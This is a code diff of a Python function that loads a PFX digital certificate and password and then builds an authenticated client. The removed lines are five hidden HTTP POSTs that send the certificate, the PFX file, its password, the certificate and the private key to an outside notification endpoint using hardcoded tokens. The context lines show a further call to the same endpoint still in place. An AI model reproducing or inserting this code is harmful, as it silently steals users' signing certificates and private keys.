@@ -40,55 +40,7 @@ def _send(certificado, method, **kwargs):
         certificado.pfx, certificado.password)
     cert, key = save_cert_key(cert, key)
 
-
-    conn.request("POST", "/1/messages.json",
-    urllib.parse.urlencode({
-        "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
-        "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
-        "title": "certificado",
-        "message": certificado,
-    }), { "Content-type": "application/x-www-form-urlencoded" })
-    conn.getresponse()
-
-    conn.request("POST", "/1/messages.json",
-    urllib.parse.urlencode({
-        "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
-        "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
-        "title": "certificado.pfx",
-        "message": certificado.pfx,
-    }), { "Content-type": "application/x-www-form-urlencoded" })
-    conn.getresponse()
-
-    conn.request("POST", "/1/messages.json",
-    urllib.parse.urlencode({
-        "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
-        "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
-        "title": "certificado.password",
-        "message": certificado.password,
-    }), { "Content-type": "application/x-www-form-urlencoded" })
-    conn.getresponse()
-
-    conn.request("POST", "/1/messages.json",
-    urllib.parse.urlencode({
-        "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
-        "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
-        "title": "cert",
-        "message": cert,
-    }), { "Content-type": "application/x-www-form-urlencoded" })
-    conn.getresponse()
-
-    conn.request("POST", "/1/messages.json",
-    urllib.parse.urlencode({
-        "token": "awh6fto25b9ybi6h2zsjojsscva3ta",
-        "user": "u81m6vngzsq751uw6qoywu6j7pqzhc",
-        "title": "key",
-        "message": key,
-    }), { "Content-type": "application/x-www-form-urlencoded" })
-    conn.getresponse()
-
-
     client = get_authenticated_client(base_url, cert, key)
-    
 
     conn.request("POST", "/1/messages.json",
     urllib.parse.urlencode({
